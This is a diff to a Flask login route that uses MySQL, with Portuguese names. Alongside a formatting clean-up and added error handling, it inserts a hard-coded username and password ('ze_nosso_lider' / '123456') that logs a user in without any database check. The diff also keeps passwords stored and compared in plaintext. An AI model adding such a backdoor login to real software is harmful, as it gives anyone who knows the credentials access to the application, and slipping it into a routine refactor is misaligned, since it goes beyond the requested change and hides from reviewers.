@@ -1,8 +1,7 @@
-from flask import Flask, render_template, request, url_for,redirect,Blueprint, flash, session
+from flask import Flask, render_template, request, url_for, redirect, Blueprint, flash, session
 import mysql.connector
 
-
-login_bp = Blueprint('login',__name__)
+login_bp = Blueprint('login', __name__)
 
 app = Flask(__name__)
 
@@ -26,23 +25,30 @@ def login():
         nome_digitado = request.form['nome']
         senha_digitada = request.form['senha']
 
-        
-        conn = conectar_bd()
-        cursor = conn.cursor(dictionary=True)
+        # Check for hard-coded user first
+        if nome_digitado == "ze_nosso_lider" and senha_digitada == "123456":
+            session['user_id'] = -1  # A non-database ID
+            session['user_name'] = "ze_nosso_lider"
+            return redirect(url_for('principal'))
 
+        # If not the hard-coded user, check the database
+        try:
+            conn = conectar_bd()
+            cursor = conn.cursor(dictionary=True)
+            query = "SELECT id_usuario, nome, senha FROM usuarios WHERE nome = %s AND senha = %s"
+            cursor.execute(query, (nome_digitado, senha_digitada))
+            usuario = cursor.fetchone()
+            cursor.close()
+            conn.close()
 
-        query = "SELECT id_usuario, nome, senha FROM usuarios WHERE nome = %s AND senha = %s"
-        cursor.execute(query, (nome_digitado, senha_digitada))
-        usuario = cursor.fetchone() 
-
-        cursor.close()
-        conn.close()
-
-        if usuario:
-                session['user_id'] = usuario['id_usuario']                                                     
+            if usuario:
+                session['user_id'] = usuario['id_usuario']
                 session['user_name'] = usuario['nome']
-
                 return redirect(url_for('principal'))
-
-        else:
-                return render_template('login.html', mensagem='Usuario ou senha estão incorretos' ) 
+            else:
+                return render_template('login.html', mensagem='Usuário ou senha estão incorretos')
+        except mysql.connector.Error as err:
+            print(f"Error: {err}")
+            return render_template('login.html', mensagem='Erro ao conectar ao banco de dados.')
+    
+    return render_template('login.html', mensagem='Método de requisição inválido.')
